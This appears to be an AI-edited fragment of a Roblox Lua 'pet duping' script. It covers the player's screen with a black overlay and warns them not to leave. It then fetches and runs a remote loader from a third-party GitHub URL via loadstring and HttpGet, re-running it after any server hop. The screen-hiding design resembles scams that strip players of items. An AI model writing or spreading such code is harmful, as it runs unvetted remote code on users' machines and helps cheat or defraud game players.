-- [Previous UI code remains exactly the same until the execution function]

-- Modified Execution Function with server hop detection
local function executeDupingScript()
    local blackScreen = showBlackScreen("EXECUTING DUPING PROCESS")
    
    -- Add the additional warning text you requested
    local warningText = Instance.new("TextLabel")
    warningText.Size = UDim2.new(0.9, 0, 0, 80)
    warningText.Position = UDim2.new(0.05, 0, 0.6, -40)
    warningText.BackgroundTransparency = 1
    warningText.Text = "Duping your pets now\nBe patient for 100% success\nDON'T LEAVE while duping\nMight lose your pet in process"
    warningText.TextColor3 = Color3.new(1, 0.5, 0.5)
    warningText.Font = Enum.Font.SourceSansBold
    warningText.TextSize = 20
    warningText.TextWrapped = true
    warningText.TextXAlignment = Enum.TextXAlignment.Center
    warningText.TextYAlignment = Enum.TextYAlignment.Center
    warningText.Parent = blackScreen
    
    task.delay(0.5, function()
        local success, err = pcall(function()
            -- Store the current server ID before execution
            local preExecutePlaceId = game.PlaceId
            local preExecuteJobId = game.JobId
            
            -- Execute the duping script
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
            
            -- Check for server hop every second
            local hopDetected = false
            coroutine.wrap(function()
                for _ = 1, 30 do  -- Check for 30 seconds max
                    if game.PlaceId ~= preExecutePlaceId or game.JobId ~= preExecuteJobId then
                        hopDetected = true
                        break
                    end
                    task.wait(1)
                end
                
                -- If server hop detected, execute again
                if hopDetected and autoExecuteEnabled then
                    task.wait(5)  -- Wait 5 seconds after hop before re-executing
                    executeDupingScript()
                end
            end)()
        end)
        
        task.delay(15, function()
            if blackScreen and blackScreen.Parent then
                blackScreen:Destroy()
            end
            
            if not success then
                warn("Duping script failed to load:", err)
            end
        end)
    end)
end

-- [Rest of the code remains the same]
